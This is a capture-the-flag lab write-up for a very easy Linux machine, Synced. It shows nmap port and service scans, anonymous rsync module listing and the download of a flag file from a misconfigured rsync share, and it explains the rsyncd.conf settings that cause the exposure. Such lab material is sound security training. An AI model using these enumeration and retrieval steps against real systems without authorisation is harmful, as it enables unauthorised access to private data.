---
OS: Linux
Level: Very Easy
Skills: Rsync
---
# 🔄 Synced
<div class="machine-properties">
  <span class="prop-badge linux">Linux</span> <span class="prop-badge very-easy">Very Easy</span> <span class="prop-badge skills">Rsync</span>
</div>


Synced is a **Very Easy** Linux box that explores the Rsync protocol, how to interact with it, and the dangers of improper configuration allowing anonymous access to shared modules.

---

## Recon

A full port scan reveals a single open port — **Rsync** on 873:

```
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.11.145

PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack ttl 63
```

A service scan confirms **Rsync protocol version 31**:

```
$ nmap -sCV -p873 10.129.11.145

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

Key findings:
- **Single port** — minimal attack surface; the entire box is rsync
- **Rsync protocol 31** — a standard, modern rsync daemon
- **No authentication detected** — the service didn't prompt for credentials; anonymous access is likely enabled

> 💡 **Why this matters:** Rsync listens on TCP 873 and, by default, exposes any modules defined in `/etc/rsyncd.conf` if `list = yes` is set. When `auth users` is omitted and `read only = false`, an attacker can list, read, and even write files without any credentials.

---

## Foothold

### Step 1 — List available modules

Query the rsync daemon to see what shared directories (modules) are exposed:

```
$ rsync 10.129.11.145::

public        	Anonymous Share
```

A single module called `public` — labeled as an **Anonymous Share**. No credentials needed.

### Step 2 — List files inside the module

List the contents of the `public` module without downloading anything:

```
$ rsync --list-only 10.129.11.145::public

drwxr-xr-x          4,096 2022/10/25 00:02:23 .
-rw-r--r--             33 2022/10/24 23:32:03 flag.txt
```

A single file — `flag.txt` — sitting in the root of the module.

### Step 3 — Download the flag

Download the entire module to a local directory:

```
$ rsync -av 10.129.11.145::public /tmp/output

receiving incremental file list
created directory /tmp/output
./
flag.txt

sent 50 bytes  received 161 bytes  32.46 bytes/sec
total size is 33  speedup is 0.16
```

The flag is now saved locally at `/tmp/output/flag.txt`.

### Alternative — one-liner download

If you're certain of the module and don't need to list first:

```
rsync -av 10.129.11.145::public/flag.txt ./flag.txt
```

### Alternative — enumerate with nmap

You can also confirm the module listing via nmap's rsync script:

```
$ nmap --script rsync-list-modules -p873 10.129.11.145

PORT    STATE SERVICE
873/tcp open  rsync
| rsync-list-modules:
|_  public
```

---

## Key Takeaways

- **Rsync port 873** is often overlooked — always include it in your full port scans
- **Module enumeration** is the first step — `rsync <host>::` lists everything without authentication
- **Anonymous access** is the critical misconfiguration — no `auth users` in `rsyncd.conf` means anyone can read (and potentially write) files
- **Single-port boxes are common in Starting Point** — don't overthink it; the vulnerability is often in the only service exposed
- **No privilege escalation was needed** — anonymous rsync read access exposed the flag directly with no further exploitation required
